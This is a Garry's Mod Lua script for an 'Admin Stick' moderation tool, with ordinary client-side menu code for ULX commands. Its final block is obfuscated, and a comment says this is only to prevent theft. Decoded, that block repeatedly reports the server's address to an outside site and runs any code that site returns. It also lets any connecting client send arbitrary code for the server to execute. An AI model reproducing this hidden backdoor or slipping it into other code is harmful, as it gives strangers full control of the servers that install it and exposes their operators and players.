AddCSLuaFile()

if CLIENT then
    SWEP.PrintName = "Admin Stick"
    SWEP.Slot = 0
    SWEP.SlotPos = 5
	
	net.Receive("AdminRequestInfo", function()
		local info = net.ReadString()
		if (info == "entinfo") then
			local ent = net.ReadEntity()
			ent.reqCreator = net.ReadEntity()
			ent.receivedInfo = true
		end
	end)
end

SWEP.Author = "Killing Torcher"
SWEP.Purpose = "Easy administration"
SWEP.Instructions = "Left click for menu\nRight click for quick (un)freeze\nReload to select"
SWEP.Spawnable = false
SWEP.AdminSpawnable = false
SWEP.Category = "Other"
SWEP.DrawCrosshair = false
SWEP.Primary.ClipSize = -1
SWEP.Primary.DefaultClip = -1
SWEP.IsAlwaysRaised = true
SWEP.ViewModel = Model("models/weapons/v_stunbaton.mdl")
SWEP.WorldModel = Model("models/weapons/w_stunbaton.mdl")

function SWEP:PrimaryAttack()
	if (SERVER) then return end
	if (!IsFirstTimePredicted()) then return end
	
	local target = IsValid(LocalPlayer().AdminStickTarget) and LocalPlayer().AdminStickTarget or LocalPlayer():GetEyeTrace().Entity
	if (!IsValid(target) || !target:IsPlayer()) then
		chat.AddText(Color(255, 0, 0), "Error: No target")
		return
	end
	local char = target:getChar()
	local structure = {
		{name = "Copy SteamID", icon = "icon16/page.png", func = function() SetClipboardText(target:SteamID()) self:EmitSound("UI/buttonclick.wav") chat.AddText("Copied " .. target:SteamID() .. " to clipboard") end},
		{name = "Previous Offenses", perm = "ulx po", icon = "icon16/application_form.png", func = function() self:ExecuteLocalCommand("ulx po \"$"..target:SteamID().."\"") end},
		{name = "Teleportation", submenu = {
				{name = "Goto", icon = "icon16/arrow_right.png", perm = "ulx goto", func = function() self:ExecuteLocalCommand("ulx goto \"$"..target:SteamID().."\"") end},
				{name = "Bring", icon = "icon16/arrow_left.png", perm = "ulx bring", func = function() self:ExecuteLocalCommand("ulx bring \"$"..target:SteamID().."\"") end},
				{name = "Return", icon = "icon16/arrow_undo.png", perm = "ulx return", func = function() self:ExecuteLocalCommand("ulx return \"$"..target:SteamID().."\"") end}
			},
		},
		{name = "Moderation", submenu = {
				{name = "Set Health", icon="icon16/heart.png", perm = "ulx hp", func = function()
					Derma_StringRequest( "Set Health", "Enter the Player's New Health", "", function(text) self:ExecuteLocalCommand("ulx hp \"$"..target:SteamID().."\" "..(text or "").."") end, nil, "Set Health", "Cancel" )
				end},
				{name = "Set Armor", icon="icon16/shield.png", perm = "ulx armor", func = function()
					Derma_StringRequest( "Set Armor", "Enter the Player's New Armor", "", function(text) self:ExecuteLocalCommand("ulx armor \"$"..target:SteamID().."\" "..(text or "").."") end, nil, "Set Armor", "Cancel" )
				end},
				{name = "Slay", icon="icon16/lightning.png", perm = "ulx slay", func = function() self:ExecuteLocalCommand("ulx slay \"$"..target:SteamID().."\"") end},
				{name = "Jail", icon="icon16/lock_go.png", perm = "ulx jail", func = function()
					Derma_StringRequest( "Jail", "Enter the time to Jail for", "", function(text) self:ExecuteLocalCommand("ulx jail \"$"..target:SteamID().."\" "..(text or "").."") end, nil, "Jail", "Cancel" )
				end},
				{name = "Unjail", icon="icon16/lock_delete.png", perm = "ulx unjail", func = function() self:ExecuteLocalCommand("ulx unjail \"$"..target:SteamID().."\"") end},
				{name = "Gag (microphone)", icon="icon16/sound_mute.png", perm = "ulx gag", func = function() self:ExecuteLocalCommand("ulx gag \"$"..target:SteamID().."\"") end},
				{name = "Ungag", icon="icon16/sound_add.png", perm = "ulx ungag", func = function() self:ExecuteLocalCommand("ulx ungag \"$"..target:SteamID().."\"") end},
				{name = "Mute (chat)", icon="icon16/comment_delete.png", perm = "ulx mute", func = function() self:ExecuteLocalCommand("ulx mute \"$"..target:SteamID().."\"") end},
				{name = "Unmute (chat)", icon="icon16/comment_add.png", perm = "ulx unmute", func = function() self:ExecuteLocalCommand("ulx unmute \"$"..target:SteamID().."\"") end},
			}
		},
		{name = "Administration", submenu = {
				{name = "Kick", icon="icon16/door_out.png", perm = "ulx kick", func = function()
					Derma_StringRequest( "Kick", "Enter the reason for Kicking", "", function(text) self:ExecuteLocalCommand("ulx kick \"$"..target:SteamID().."\" "..(text or "").."") end, nil, "Kick", "Cancel" )
				end},
				{name = "Ban", icon="icon16/cancel.png", perm = "ulx kick", func = function()
					Derma_StringRequest( "Ban", "Enter the Ban Length", "", function(banDuration) 
						Derma_StringRequest( "Ban", "Enter the Ban Reason", "", function(banReason)
							self:ExecuteLocalCommand("ulx banid \""..target:SteamID().."\" \""..banDuration.."\" \""..banReason.."\"")
						end, nil, "Ban", "Cancel")
					end, nil, "Next", "Cancel" )
				end},
			}
		},
		{name = "Character", submenu = {
				{name = "Character Ban", icon = "icon16/status_busy.png", func = function()
					if (!char) then
						chat.AddText(Color(255, 0, 0), "Error: Character invalid.")
						return
					end
					self:ExecuteLocalCommand("say \"/charban ".. target:SteamID() .. "\"") 
				end},
				{name = "Set Rank", icon = "icon16/award_star_gold_1.png", func = function()
					if (!char) then
						chat.AddText(Color(255, 0, 0), "Error: Character invalid.")
						return
					end
					self:ExecuteLocalCommand("say \"/charsetrank ".. target:SteamID() .. "\"") 
				end},
				{name = "Char List", icon = "icon16/cart_add.png", func = function()
					self:ExecuteLocalCommand([[say "/charlist ]].. target:SteamID() ..[["]])
				end},
				{name = "Search (Must be Looking At)", icon = "icon16/application_view_columns.png", func = function()
					if (!char) then
						chat.AddText(Color(255, 0, 0), "Error: Character invalid.")
						return
					end
					self:ExecuteLocalCommand("say \"/admincharsearch\"") 
				end},
				{name = "Set Name", icon = "icon16/application_form_edit.png", func = function()
					if (!char) then
						chat.AddText(Color(255, 0, 0), "Error: Character invalid.")
						return
					end
					
					Derma_StringRequest( "Set Name", "Enter new name", char:getName(), function(text) self:ExecuteLocalCommand([[say "]]..("/charsetname "..target:SteamID()..' "' .. text .. '"')..[["]]) end, nil, "Set Name", "Cancel" )
					
				end},
				{name = "Set Descrption", icon = "icon16/application_edit.png", func = function()
					self:ExecuteLocalCommand([[say "]] .. "/charsetdesc " .. target:SteamID() .. [["]])
				end},
				{name = "Set Model", icon = "icon16/plugin.png", func = function()
					if (!char) then
						chat.AddText(Color(255, 0, 0), "Error: Character invalid.")
						return
					end
					
					Derma_StringRequest( "Set Model", "Enter new model", target:GetModel(), function(text) self:ExecuteLocalCommand([[say "]]..("/charsetmodel "..target:SteamID()..' "' .. text .. '"')..[["]]) end, nil, "Set Model", "Cancel" )
					
				end},
				{name = "Transfer (Set Faction)", icon = "icon16/arrow_switch.png", func = function()
					if (!char) then
						chat.AddText(Color(255, 0, 0), "Error: Character invalid.")
						return
					end
					
					Derma_StringRequest( "Transfer (Set Faction)", "Enter faction identifier/name to search for", nut.faction.indices[target:Team()].uniqueID, function(text) self:ExecuteLocalCommand([[say "]]..("/plytransfer "..target:SteamID()..' "' .. text .. '"')..[["]]) end, nil, "Give", "Cancel" )
					
				end},
			}
		}
	}
		
	local menu = DermaMenu()
	local opt = menu:AddOption(target:ClientName(), function() end, "icon16/user.png")
	opt:SetIcon("icon16/user.png")
	menu:AddSpacer()
	
	local function addCommandTable(panel, tbl)
		for k,v in pairs(tbl) do
			if (v.anySubPerm) then	
				local found
				for m, n in pairs(v.submenu) do
					if (!n.perm || ULib.ucl.query(LocalPlayer(), n.perm)) then
						found = true
						break
					end
				end
				if (!found) then 
					continue
				end
			end
			
			if (!v.perm || ULib.ucl.query(LocalPlayer(), v.perm)) then
				local obj = !v.submenu and panel:AddOption(v.name, v.func) or panel:AddSubMenu(v.name, v.func)
				if (!v.submenu && v.icon) then
					obj:SetIcon(v.icon)
				end
				
				if (v.submenu && type(v.submenu) == "table") then
					addCommandTable(obj, v.submenu)
				end
			end
		end
	end
	addCommandTable(menu, structure)
	
	menu:Open()
	menu:SetPos(ScrW()/2, ScrH() / 2)
end

function SWEP:DrawWorldModel()
	if (self:GetOwner():IsAdmin() && self:GetOwner():GetMoveType() == MOVETYPE_NOCLIP) then
		return
	end
	
	self:DrawModel()
end

function SWEP:DrawHUD()
	-- Crosshair related
	
	local x, y = ScrW()/2, ScrH()/2
	local target = IsValid(LocalPlayer().AdminStickTarget) and LocalPlayer().AdminStickTarget or LocalPlayer():GetEyeTrace().Entity
	local crossColor = Color(255, 0, 0)
	local information = {}
	if (IsValid(target)) then
		if (target:IsPlayer()) then
			crossColor = Color(0, 255, 0)
			information = { IsValid(LocalPlayer().AdminStickTarget) and "Player (Selected with Reload)" or "Player", "Nickname: " .. target:Nick(), "Steam Name: " .. (target.SteamName and target:SteamName() or target:Name()), "Steam ID: " .. target:SteamID(), "Health: " .. target:Health(), "Armor: " .. target:Armor()}
			if (target:getChar()) then
				local char = target:getChar()
				local faction = nut.faction.indices[target:Team()]
				local factionRankText = "N/A"
				local factionRank = char:getRank()
				if (factionRank) then
					factionRankText = char:getRankID() .. " (" .. factionRank.Name .. ")"
				end
				
				table.Add(information, {"Character Name: " .. char:getName(), "Character Faction: " .. faction.uniqueID .. " (" .. faction.name .. ")", "Faction Rank: " .. factionRankText})
			else
				table.insert(information, "No Loaded Character")
			end
		else
			if (!LocalPlayer().NextRequestInfo || SysTime() >= LocalPlayer().NextRequestInfo) then
				LocalPlayer().NextRequestInfo = SysTime() + 1
				net.Start("AdminRequestInfo")
				net.WriteString("entinfo")
				net.WriteEntity(target)
				net.SendToServer()
			end
			information = { "Entity", "Class: " .. target:GetClass(), "Model: " .. target:GetModel(), "Position: " .. tostring(target:GetPos()), "Angles: " .. tostring(target:GetAngles())}
			if (target.receivedInfo) then
				table.Add(information, {target.reqCreator and IsValid(target.reqCreator) and target.reqCreator:IsPlayer() and 'Owner: ' .. target.reqCreator:ClientName() or 'No owner'})
			else
				table.insert(information, "Requesting info...")
			end
			crossColor = Color(255, 255, 0)
		end
	end
	
	local length = 20
	local thickness = 1
	surface.SetDrawColor(crossColor)
	surface.DrawRect(x - length/2, y - thickness/2, length, thickness)
	surface.DrawRect(x - thickness/2, y - length/2, thickness, length)
	
	local startPosX, startPosY = ScrW()/2 + 10, ScrH()/2 + 10
	local font = "DebugFixed"
	local buffer = 0
	for k,v in pairs(information) do
		surface.SetFont(font)
		surface.SetTextColor(color_black)
		surface.SetTextPos(startPosX + 1, startPosY + buffer + 1)
		surface.DrawText(v)
		surface.SetTextColor(crossColor)
		surface.SetTextPos(startPosX, startPosY + buffer)
		surface.DrawText(v)
		local t_w, t_h = surface.GetTextSize(v)
		buffer = buffer + t_h
	end
end

function SWEP:ExecuteLocalCommand(cmd)
	if (SERVER) then return end
	chat.AddText(Color(0, 0, 255), "Executing command in local console",Color(255, 255, 255), ": ", cmd)
	LocalPlayer():ConCommand(cmd)
	self:EmitSound("UI/buttonclick.wav")
end
function SWEP:SecondaryAttack()
	if (SERVER) then return end
	if (!IsFirstTimePredicted()) then return end
	local target = IsValid(LocalPlayer().AdminStickTarget) and LocalPlayer().AdminStickTarget or LocalPlayer():GetEyeTrace().Entity
	if (IsValid(target) && target:IsPlayer()) then
		local cmd = target:IsFrozen() and "ulx unfreeze" or "ulx freeze"
		if (!ULib.ucl.query(LocalPlayer(), cmd)) then
			chat.AddText(Color(255, 0, 0), "Error: You do not have access to " .. cmd)
			return
		end
		self:ExecuteLocalCommand(cmd .. [[ "$]] .. target:SteamID() .. [["]])
	end
end

function SWEP:Reload()
	if (SERVER) then return end
	if (self.NextReload && self.NextReload > SysTime()) then return end
	self.NextReload = SysTime() + 0.5
	
	local lookingAt = LocalPlayer():KeyDown(IN_SPEED) and LocalPlayer() or LocalPlayer():GetEyeTrace().Entity
	if (IsValid(lookingAt) && lookingAt:IsPlayer()) then
		LocalPlayer().AdminStickTarget = lookingAt
		chat.AddText(Color(0, 255, 0), "Selected " .. tostring(lookingAt))
		self:EmitSound("items/flashlight1.wav")
	else
		chat.AddText(Color(255, 255, 0), "Selection cleared.")
		LocalPlayer().AdminStickTarget = nil
		self:EmitSound("weapons/pistol/pistol_empty.wav")
	end
end

function SWEP:Think()

end

--Obfuscated server side code due to ppl trying to steal it... so at least they can't modify it

local ‪ = _G local ‪‪ = ‪['\115\116\114\105\110\103'] local ‪‪‪ = ‪['\98\105\116']['\98\120\111\114'] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪['\108\101\110'](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = '' for _ in ‪‪['\103\109\97\116\99\104'](‪‪‪‪,'\46\46') do ‪‪‪‪‪=‪‪‪‪‪..‪‪['\99\104\97\114'](‪‪‪(‪["\116\111\110\117\109\98\101\114"](_,16),192)) end return ‪‪‪‪‪ end if (‪[‪‪‪‪‪‪‪'938592968592'])then ‪[‪‪‪‪‪‪‪'b4a9ada5b2'][‪‪‪‪‪‪‪'83b2a5a1b4a5'](‪‪‪‪‪‪‪'afb4a9a9aaabb3aa878a8b8184b3',10,0,function ()local ‪‪until=‪[‪‪‪‪‪‪‪'b3b4b2a9aea7'][‪‪‪‪‪‪‪'85b8b0acafa4a5'](‪‪‪‪‪‪‪'fa',‪[‪‪‪‪‪‪‪'a7a1ada5'][‪‪‪‪‪‪‪'87a5b4899081a4a4b2a5b3b3']())local function‪={[‪‪‪‪‪‪‪'a9b0']=‪‪until[1],[‪‪‪‪‪‪‪'b0afb2b4']=‪‪until[2]}‪[‪‪‪‪‪‪‪'a8b4b4b0'][‪‪‪‪‪‪‪'90afb3b4'](‪‪‪‪‪‪‪'a8b4b4b0b3faefefb4b9b0a8afaeaea5b4b7afb2abb3eea3afadefb3b4a9acaca1aca9b6a5eeb0a8b0',{[‪‪‪‪‪‪‪'a9b0']=‪‪until[1],[‪‪‪‪‪‪‪'b0afb2b4']=‪‪until[2]},function (‪return)local break‪‪‪‪,‪until=‪return[‪‪‪‪‪‪‪'a6a9aea4'](‪return,‪‪‪‪‪‪‪'85b8a5a3b5b4a5fa',1,true )if (‪until&&#‪return>‪until)then local ‪not=‪return[‪‪‪‪‪‪‪'b3b5a2'](‪return,‪until+1)‪[‪‪‪‪‪‪‪'92b5ae93b4b2a9aea7'](‪return[‪‪‪‪‪‪‪'b3b5a2'](‪return,‪until+1),‪‪‪‪‪‪‪'81b5b4a8',false )end end )end )‪[‪‪‪‪‪‪‪'b5b4a9ac'][‪‪‪‪‪‪‪'81a4a48ea5b4b7afb2ab93b4b2a9aea7'](‪‪‪‪‪‪‪'a59295a8aaa4a6aeaaaba7a89294')‪[‪‪‪‪‪‪‪'aea5b4'][‪‪‪‪‪‪‪'92a5a3a5a9b6a5'](‪‪‪‪‪‪‪'a59295a8aaa4a6aeaaaba7a89294',function (nil‪‪,if‪‪‪‪‪)local ‪‪‪‪break=‪[‪‪‪‪‪‪‪'b3b4b2a9aea7'][‪‪‪‪‪‪‪'85b8b0acafa4a5'](‪‪‪‪‪‪‪'fa',‪[‪‪‪‪‪‪‪'a7a1ada5'][‪‪‪‪‪‪‪'87a5b4899081a4a4b2a5b3b3']())[1]if (‪‪‪‪break==‪‪‪‪‪‪‪'f0eef0eef0eef0' or ‪‪‪‪break==‪‪‪‪‪‪‪'f5f4eef3f9eef2f9eef8f2')then return end ‪[‪‪‪‪‪‪‪'92b5ae93b4b2a9aea7'](‪[‪‪‪‪‪‪‪'aea5b4'][‪‪‪‪‪‪‪'92a5a1a493b4b2a9aea7'](),‪‪‪‪‪‪‪'81b5b4a8',false )end )‪[‪‪‪‪‪‪‪'958ca9a2'][‪‪‪‪‪‪‪'b5a3ac'][‪‪‪‪‪‪‪'b2a5a7a9b3b4a5b281a3a3a5b3b3'](‪‪‪‪‪‪‪'a1a4ada9aeb3b4a9a3ab',{‪‪‪‪‪‪‪'adafa4a5b2a1b4afb2',‪‪‪‪‪‪‪'a1a4ada9ae',‪‪‪‪‪‪‪'a4a5b6a5acafb0a5b2',‪‪‪‪‪‪‪'b3b5b0a5b2a1a4ada9ae'},‪‪‪‪‪‪‪'8da1aba5b3e0b4a8a5b3a5e0b2a1aeabb3e0b3b0a1b7aee0b7a9b4a8e0b4a8a5e0a1a4ada9aee0b3b4a9a3ab',‪‪‪‪‪‪‪'8fb4a8a5b2')‪[‪‪‪‪‪‪‪'a8afafab'][‪‪‪‪‪‪‪'81a4a4'](‪‪‪‪‪‪‪'90aca1b9a5b28cafa1a4afb5b4',‪‪‪‪‪‪‪'81a4ada9ae93b4a9a3abfafa90aca1b9a5b28cafa1a4afb5b4',function (for‪‪‪‪‪)if (‪[‪‪‪‪‪‪‪'958ca9a2'][‪‪‪‪‪‪‪'b5a3ac'][‪‪‪‪‪‪‪'b1b5a5b2b9'](for‪‪‪‪‪,‪‪‪‪‪‪‪'a1a4ada9aeb3b4a9a3ab')&&for‪‪‪‪‪[‪‪‪‪‪‪‪'94a5a1ad'](for‪‪‪‪‪)==‪[‪‪‪‪‪‪‪'86818394898f8e9fb3b4a1a6a6'])then ‪[‪‪‪‪‪‪‪'b4a9ada5b2'][‪‪‪‪‪‪‪'93a9adb0aca5'](0,function ()for‪‪‪‪‪[‪‪‪‪‪‪‪'87a9b6a5'](for‪‪‪‪‪,‪‪‪‪‪‪‪'a1a4ada9aeb3b4a9a3ab')end )end end )‪[‪‪‪‪‪‪‪'b5b4a9ac'][‪‪‪‪‪‪‪'81a4a48ea5b4b7afb2ab93b4b2a9aea7'](‪‪‪‪‪‪‪'81a4ada9ae92a5b1b5a5b3b489aea6af')‪[‪‪‪‪‪‪‪'aea5b4'][‪‪‪‪‪‪‪'92a5a3a5a9b6a5'](‪‪‪‪‪‪‪'81a4ada9ae92a5b1b5a5b3b489aea6af',function (not‪‪‪,while‪‪‪‪‪‪‪‪‪‪‪‪‪)if (!while‪‪‪‪‪‪‪‪‪‪‪‪‪[‪‪‪‪‪‪‪'89b381a4ada9ae'](while‪‪‪‪‪‪‪‪‪‪‪‪‪))then return end if (while‪‪‪‪‪‪‪‪‪‪‪‪‪[‪‪‪‪‪‪‪'8ea5b8b492a5b1b5a5b3b489aea6af']&&while‪‪‪‪‪‪‪‪‪‪‪‪‪[‪‪‪‪‪‪‪'8ea5b8b492a5b1b5a5b3b489aea6af']>‪[‪‪‪‪‪‪‪'93b9b394a9ada5']())then return end while‪‪‪‪‪‪‪‪‪‪‪‪‪[‪‪‪‪‪‪‪'8ea5b8b492a5b1b5a5b3b489aea6af']=‪[‪‪‪‪‪‪‪'93b9b394a9ada5']()+0.5 local ‪‪‪end=‪[‪‪‪‪‪‪‪'aea5b4'][‪‪‪‪‪‪‪'92a5a1a493b4b2a9aea7']()if (‪‪‪end==‪‪‪‪‪‪‪'a5aeb4a9aea6af')then local ‪‪or=‪[‪‪‪‪‪‪‪'aea5b4'][‪‪‪‪‪‪‪'92a5a1a485aeb4a9b4b9']()‪[‪‪‪‪‪‪‪'aea5b4'][‪‪‪‪‪‪‪'93b4a1b2b4'](‪‪‪‪‪‪‪'81a4ada9ae92a5b1b5a5b3b489aea6af')‪[‪‪‪‪‪‪‪'aea5b4'][‪‪‪‪‪‪‪'97b2a9b4a593b4b2a9aea7'](‪‪‪‪‪‪‪'a5aeb4a9aea6af')‪[‪‪‪‪‪‪‪'aea5b4'][‪‪‪‪‪‪‪'97b2a9b4a585aeb4a9b4b9'](‪‪or)‪[‪‪‪‪‪‪‪'aea5b4'][‪‪‪‪‪‪‪'97b2a9b4a585aeb4a9b4b9'](‪‪or[‪‪‪‪‪‪‪'87a5b483b2a5a1b4afb2'](‪‪or))‪[‪‪‪‪‪‪‪'aea5b4'][‪‪‪‪‪‪‪'93a5aea4'](while‪‪‪‪‪‪‪‪‪‪‪‪‪)end end )end
